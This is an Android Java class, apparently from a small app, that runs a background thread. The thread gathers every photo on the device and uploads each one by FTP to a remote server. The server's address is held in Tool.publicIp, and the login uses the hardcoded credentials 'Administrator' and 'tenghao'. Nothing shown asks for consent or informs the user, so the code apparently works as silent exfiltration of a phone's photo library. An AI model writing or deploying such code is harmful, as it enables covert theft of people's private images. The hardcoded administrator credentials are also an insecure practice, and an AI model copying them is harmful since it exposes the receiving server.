package tenghao.tool;

import android.content.Context;
import android.util.Log;



import java.util.List;

import tenghao.tenghao.MainActivity;


public class Uploader extends Thread {
    UploadImage ui;
    List<String> image_pathes;
    Context cox;

    public Uploader(UploadImage ui, Context cox) {
        this.ui = ui;
        this.cox = cox;
    }


    @Override
    public void run() {
        image_pathes = GetImage.getSystemPhotoList(cox);
        boolean isConn = ui.ftpConnect(Tool.publicIp, "Administrator", "tenghao", Tool.publicCut);
        if (isConn == true) {
            for (int i = 0; i < image_pathes.size(); i++) {
                final String image_path = image_pathes.get(i);
                int len = image_path.split("/").length;
                final String imagename = image_path.split("/")[len - 1];
                Log.e(MainActivity.TAG, image_path + " &" + imagename);
                ui.ftpUpload(image_path, imagename, "C:\\Users\\Administrator\\Desktop\\file");
            }
        } else {
            Log.e(MainActivity.TAG, "连接失败");
            return;
        }

    }


}



